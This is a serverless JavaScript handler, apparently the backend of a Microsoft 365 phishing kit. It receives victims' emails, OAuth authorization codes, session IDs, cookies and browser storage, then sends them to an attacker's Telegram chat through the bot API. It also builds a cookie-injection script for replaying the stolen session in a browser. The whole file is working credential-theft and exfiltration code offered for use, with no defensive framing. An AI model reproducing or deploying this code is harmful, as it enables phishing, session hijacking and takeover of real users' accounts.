export const handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  console.log('🚀 sendTelegram function starting...');

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    const data = JSON.parse(event.body);
    console.log('📥 Received data:', JSON.stringify(data, null, 2));

    // Environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    console.log('🔧 Environment check:', {
      hasToken: !!TELEGRAM_BOT_TOKEN,
      hasChatId: !!TELEGRAM_CHAT_ID,
      tokenStart: TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.substring(0, 10) + '...' : 'missing'
    });

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('❌ Missing Telegram credentials');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Telegram credentials not configured',
          details: {
            hasToken: !!TELEGRAM_BOT_TOKEN,
            hasChatId: !!TELEGRAM_CHAT_ID
          }
        }),
      };
    }

    // Validate bot token format
    if (!TELEGRAM_BOT_TOKEN.match(/^\d+:[A-Za-z0-9_-]+$/)) {
      console.error('❌ Invalid bot token format');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: 'Invalid bot token format' }),
      };
    }

    // Prepare message content
    const email = data.email || 'oauth-user@microsoft.com';
    const domain = data.domain || 'unknown-domain';
    const sessionId = data.sessionId || 'no-session';
    const hasAuthCode = data.authorizationCode || data.hasAuthCode || false;
    const authCode = data.authorizationCode || 'Not captured';
    
    const timestamp = new Date().toISOString();
    
    let messageText = `🔐 Microsoft OAuth Login Captured!\n\n`;
    messageText += `📧 Email: ${email}\n`;
    messageText += `🌐 Domain: ${domain}\n`;
    messageText += `🔑 Session ID: ${sessionId}\n`;
    messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured' : 'Missing'}\n`;
    messageText += `🕒 Time: ${timestamp}\n\n`;
    
    if (authCode && authCode !== 'Not captured') {
      messageText += `📋 Authorization Code:\n\`${authCode}\`\n\n`;
    }
    
    // Add cookie info if available
    if (data.cookies && Array.isArray(data.cookies) && data.cookies.length > 0) {
      messageText += `🍪 Cookies: ${data.cookies.length} captured\n`;
    } else {
      messageText += `🍪 Cookies: None captured\n`;
    }
    
    // Add browser fingerprint if available
    if (data.browserFingerprint) {
      messageText += `🖥️ Browser: ${data.browserFingerprint.userAgent ? data.browserFingerprint.userAgent.substring(0, 50) + '...' : 'Unknown'}\n`;
    }

    console.log('📤 Sending message to Telegram:', messageText.substring(0, 200) + '...');

    // Send main message to Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const telegramPayload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: messageText,
      parse_mode: 'Markdown'
    };

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(telegramPayload),
    });

    const result = await response.json();
    console.log('📨 Telegram API response:', result);

    if (!response.ok || !result.ok) {
      console.error('❌ Telegram API error:', result);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Failed to send to Telegram',
          telegramError: result,
          statusCode: response.status
        }),
      };
    }

    console.log('✅ Main message sent to Telegram');

    // Process and send cookies as file
    let fileSent = false;
    try {
      let formattedCookies = [];
      
      // Parse cookies from various data sources
      if (data.formattedCookies && Array.isArray(data.formattedCookies)) {
        formattedCookies = data.formattedCookies;
      } else if (data.cookies && Array.isArray(data.cookies)) {
        formattedCookies = data.cookies;
      } else if (data.documentCookies && typeof data.documentCookies === 'string') {
        const cookieStrings = data.documentCookies.split(';');
        formattedCookies = cookieStrings
          .map(str => {
            const [name, ...valueParts] = str.trim().split('=');
            const value = valueParts.join('=');
            return name && value ? {
              name: name.trim(),
              value: value.trim(),
              domain: '.login.microsoftonline.com',
              path: '/',
              secure: true,
              httpOnly: false,
              sameSite: 'none',
              expirationDate: Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60,
              hostOnly: false,
              session: false,
              storeId: null,
            } : null;
          })
          .filter(Boolean);
      }

      // Ensure all cookies have Microsoft domain
      const microsoftCookies = formattedCookies.map(c => ({
        ...c,
        domain: '.login.microsoftonline.com',
      }));

      // Create JavaScript injection code
      const jsInjectionCode = microsoftCookies.length > 0
        ? `!function(){console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(
            JSON.stringify(microsoftCookies)
          )});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;location.reload()}();`
        : `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;

      // Create cookies file content
      const cookiesFileContent = `// Microsoft 365 Cookie Data for ${email} - ${timestamp}
// Authorization Code: ${authCode ? 'Captured' : 'Not captured'}
// Session ID: ${sessionId}
// Domain: ${domain}
// Cookies Found: ${microsoftCookies.length}

let email = "${email}";
let sessionId = "${sessionId}";
let authorizationCode = "${authCode || 'Not captured'}";

// Cookie Injection Script (paste in browser console on Microsoft login page):
${jsInjectionCode}

// Raw Cookie Data:
${JSON.stringify(microsoftCookies, null, 2)}

// Session Storage:
${data.browserFingerprint?.sessionStorage || 'Empty'}

// Local Storage:
${data.browserFingerprint?.localStorage || 'Empty'}

// Authorization Code (for manual use):
// ${authCode || 'Not captured'}
`;

      // Send cookies as file to Telegram
      const fileName = `microsoft365_cookies_${email.replace('@', '_at_')}_${Date.now()}.js`;
      const boundary = '----formdata-boundary-' + Math.random().toString(36);
      
      let formData = '';
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
      formData += `${TELEGRAM_CHAT_ID}\r\n`;
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`;
      formData += `Content-Type: text/javascript\r\n\r\n`;
      formData += cookiesFileContent;
      formData += `\r\n`;
      formData += `--${boundary}--\r\n`;

      const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`
        },
        body: formData,
      });

      if (fileResponse.ok) {
        fileSent = true;
        console.log('✅ Cookies file sent to Telegram');
      } else {
        const fileErrorText = await fileResponse.text();
        console.error('❌ File upload failed:', fileErrorText);
        
        // Fallback: send as text message if file fails
        const fallbackMessage = `📁 **MICROSOFT 365 COOKIES** (${microsoftCookies.length} cookies)\n\n\`\`\`\n${cookiesFileContent.substring(0, 3500)}\n\`\`\`\n\n${cookiesFileContent.length > 3500 ? '*...truncated*' : ''}`;
        
        const fallbackResponse = await fetch(telegramUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: fallbackMessage,
            parse_mode: 'Markdown',
          }),
        });

        if (fallbackResponse.ok) {
          fileSent = true;
          console.log('✅ Fallback cookies text sent to Telegram');
        }
      }
    } catch (fileError) {
      console.error('❌ File generation error:', fileError);
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Data sent to Telegram successfully',
        telegramMessageId: result.result?.message_id,
        fileSent: fileSent,
        cookieCount: data.formattedCookies?.length || data.cookies?.length || 0
      }),
    };

  } catch (error) {
    console.error('❌ Handler error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        details: error.message,
        stack: error.stack
      }),
    };
  }
};